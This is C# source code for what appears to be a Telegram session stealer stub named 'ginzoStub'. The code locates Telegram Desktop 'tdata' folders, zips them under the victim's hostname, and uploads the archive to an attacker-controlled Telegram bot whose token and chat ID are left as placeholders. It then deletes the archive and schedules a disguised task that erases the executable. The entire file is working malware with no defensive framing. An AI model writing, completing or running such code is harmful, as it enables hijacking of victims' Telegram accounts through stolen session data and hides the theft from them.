using System;
using System.IO;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Ionic.Zip;

namespace ginzoStub
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            FindAndArchive();
        }

        private static async Task SendFileToBot(string filePath, string chatId, string botToken, string message)
        {
            string url = $"https://api.telegram.org/bot{botToken}/sendDocument";
            using (HttpClient client = new HttpClient())
            using (MultipartFormDataContent formData = new MultipartFormDataContent())
            using (FileStream fileStream = File.OpenRead(filePath))
            {
                formData.Add(new StringContent(chatId), "chat_id");
                formData.Add(new StringContent(message), "caption");
                formData.Add(new StreamContent(fileStream), "document", Path.GetFileName(filePath));

                HttpResponseMessage response = await client.PostAsync(url, formData);
                response.EnsureSuccessStatusCode();
            }
        }

        private static async Task ArchiveAndSendAsync(string folderPath, string chatId, string botToken, string message)
        {
            string hostname = Environment.MachineName;
            string tempFolder = Path.GetTempPath();
            string archiveName = $"{hostname}.zip";
            string archivePath = Path.Combine(tempFolder, archiveName);

            using (ZipFile zip = new ZipFile())
            {
                zip.AddDirectory(folderPath);
                zip.Save(archivePath);
            }

            await SendFileToBot(archivePath, chatId, botToken, message);
            File.Delete(archivePath); // Deleting the archive

            // Creating a bat file for self-deletion
            string batFileName = Path.GetRandomFileName().Replace(".", "") + ".bat";
            string batFilePath = Path.Combine(tempFolder, batFileName);

            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            File.WriteAllText(batFilePath, $"@echo off\r\nif exist \"{exePath}\" del /f /q \"{exePath}\"");

            string taskName = $"ConsoleApplicationSetup_{Guid.NewGuid()}";
            DateTime executionTime = DateTime.Now.AddMinutes(1);
            string schtasksCommand = $"/create /tn {taskName} /tr \"\"\"{batFilePath}\"\"\" /sc once /st {executionTime.ToString("HH:mm")}";

            System.Diagnostics.Process.Start("schtasks", schtasksCommand);
        }

        private static void FindAndArchive()
        {
            string botToken = "KINGTOKENBOT";
            string chatId = "KINGCHATID";

            string[] pathsToCheck = {
                @"D:\Telegram Desktop\tdata",
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Roaming\Telegram Desktop\tdata"),
                @"C:\Program Files\Telegram Desktop\tdata"
            };

            foreach (string path in pathsToCheck)
            {
                if (Directory.Exists(path))
                {
                    ArchiveAndSendAsync(path, chatId, botToken, "+---------------NEW LOG-----------+\n\nTDATA Hooked successfull!\n\n+---------------NEW LOG-----------+").Wait();
                    Environment.Exit(0);
                }
            }
        }
    }
}
